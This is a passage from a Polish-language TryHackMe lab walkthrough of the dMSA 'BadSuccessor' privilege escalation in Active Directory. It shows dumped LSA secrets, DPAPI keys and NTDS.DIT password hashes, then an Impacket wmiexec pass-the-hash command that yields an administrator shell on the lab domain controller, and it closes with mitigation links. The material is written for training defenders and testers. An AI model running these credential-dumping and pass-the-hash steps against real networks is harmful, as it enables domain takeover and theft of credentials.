[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
TRYHACKME\DC-LAB2025-01$:plain_password_hex:7d66c796281e513dc8c183387baba78b6e81f0ee9c998af58ecebc8b228165decf92d03b1f3b2c541ff416b563f13d7f10e8cb0576587e5858c5b5e08f2bb2dd5345f9b4f81336c9603b2745727c4b3ab1e8e64825e4b707334b89b33557bcfbdb08731610b3ca5f50f022cbba08d61eba612d1cf8c288a1803dbf1128d8e9b0b74ef1bc78b44987c7139a32233a720f823e010e51021da4e0382df493c6b9bf24f8fb7e9b919bd8facdaf15d240c4b25f668dd148b2b736526f57c1efa3bd36fd3858c5135393e7a27c527b5980aaaf963d5446f3fcce9290439999abe5666c1cc69ad07ce3d5ea0f39b966455d78fc
TRYHACKME\DC-LAB2025-01$:aad3b435b51404eeaad3b435b51404ee:7c7def3cf337002cce0f6951e425efee:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xed2050afde5b4f719678688ad45be1e83d11aa60
dpapi_userkey:0xd81a86dcced0c9d6c63348640407fc4ddd7088f9
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:984f755c74xxxxxxxxxxxxxx43976fec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52c43c39a2e4a1bef1cf81e06dbc9e06:::
tryhackme.local\strategos:1103:aad3b435b51404eeaad3b435b51404ee:0d278dd8162621bc91a6c0455c6af18a:::
tryhackme.local\user01:1104:aad3b435b51404eeaad3b435b51404ee:b29d0ad81e7f691149afab6926f05ffc:::
tryhackme.local\user02:1105:aad3b435b51404eeaad3b435b51404ee:270c42b9a0300a68c3d636764576b324:::
example.com\hdale:1112:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
example.com\pturner:1113:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
example.com\mfesto:1114:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
example.com\koscope:1115:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
example.com\bfitwell:1116:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
example.com\tgrate:1117:aad3b435b51404eeaad3b435b51404ee:348bbb75c57749a09b3ad42c8b092608:::
...
...
```

Teraz możemy użyć `wmiexec.py`klasy Impacket do `pass-the-hash`przeprowadzenia ataku, aby zalogować się jako Administrator za pomocą następującego polecenia:

`python3 /opt/impacket/examples/wmiexec.py 'tryhackme.local/administrator@10.211.101.10' -hashes :984f755c74xxxxxxxxxxxxxx43976fec`

- Określamy domenę, użytkownika i adres IP, do których się logujemy, korzystając z `'tryhackme.local/administrator@10.211.101.10'`opcji
- **Wskazujemy skrót NTLM** użytkownika , którego używamy do uwierzytelniania, za pomocą  `-hashes :<NTLM hash>`opcji

Terminal Linux

```shell-session
root@attackbox:~# python3 /opt/impacket/examples/wmiexec.py 'tryhackme.local/administrator@10.211.101.10' -hashes :984f755c74xxxxxxxxxxxxxx43976fec
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
tryhackme\administrator

C:\>hostname
DC-LAB2025-01
```

W tym pomieszczeniu skupiono się na dMSA, stosunkowo nowej funkcji, i pokazano w warunkach laboratoryjnych, w jaki sposób użytkownik z ograniczonymi uprawnieniami zdołał je rozszerzyć.

Obecnie nie ma żadnej poprawki od Microsoftu. Podstawowe [środki zaradcze(otwiera się w nowej karcie)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)Koncentruje się na identyfikowaniu kont z możliwością tworzenia obiektów dMSA i ograniczaniu tego uprawnienia do zaufanych administratorów. Aby uzyskać bardziej szczegółowe informacje na temat sposobów łagodzenia zagrożeń, zalecamy zapoznanie się z artykułem [Understanding & Mitigating BadSuccessor.(otwiera się w nowej karcie)](https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/)wpis na blogu Jima Sykory ze SpecterOps.
